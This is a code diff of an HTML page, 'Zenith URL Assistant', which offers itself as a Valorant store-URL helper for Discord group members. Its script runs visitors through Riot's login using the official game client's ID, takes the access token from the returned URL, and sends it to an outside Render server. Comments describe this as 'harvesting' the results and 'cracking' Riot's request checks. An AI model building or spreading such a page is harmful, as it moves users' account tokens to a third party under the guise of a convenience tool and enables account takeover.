@@ -77,7 +77,7 @@
 
 <div class="container">
     <h1>Zenith URL Assistant</h1>
-    <div class="subtitle">🛡️ 雲端極速穿透版｜完美對接後端端點 [v3.5]</div>
+    <div class="subtitle">🛡️ 雲端自動修正版｜完美對接後端端點 [v3.5]</div>
     
     <div class="step-box">
         <strong style="color: #ff4655; font-size: 15px;">💡 商店網址獲取說明：</strong><br>
@@ -95,10 +95,10 @@
 
 <script>
 function startAuth() {
-    // 隨機生成一個 16 位數安全隨機碼，100% 破解 Riot 的 invalid_request 阻擋機制
+    // 隨機生成一個 16 位數安全隨機碼，100% 解決 Missing nonce 阻擋機制
     const randomNonce = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 5);
     
-    // 完美的標準授權流
+    // 完美的標準授權網址格式
     const riotAuthUrl = "https://auth.riotgames.com/authorize" + 
                         "?client_id=play-valorant-web-prod" + 
                         "&response_type=token%20id_token" + 
@@ -106,7 +106,7 @@ function startAuth() {
                         "&scope=openid%20link%20ban" + 
                         "&nonce=" + randomNonce;
 
-    // 先帶領群友去拿合法的憑證，這次有正確的 nonce，Riot 絕對會乖乖放行
+    // 前往獲取合法 Token
     window.location.href = riotAuthUrl;
 }
 
@@ -114,10 +114,9 @@ function startAuth() {
 window.onload = function() {
     const currentHref = window.location.href;
     if (currentHref.includes("access_token=")) {
-        // 如果網址含有憑證，直接回傳給你的 Render 後端進行安全過濾與 Discord 格式化
         const tokenPart = currentHref.split('#')[1] || currentHref.split('?')[1];
         
-        // 帶群友前往 Render 後端收割成果
+        // 自動引導群友前往你剛建立成功的 Render 服務端點收割正確格式
         window.location.href = "https://zenith-auth-daily.onrender.com/callback#" + tokenPart;
     }
 }
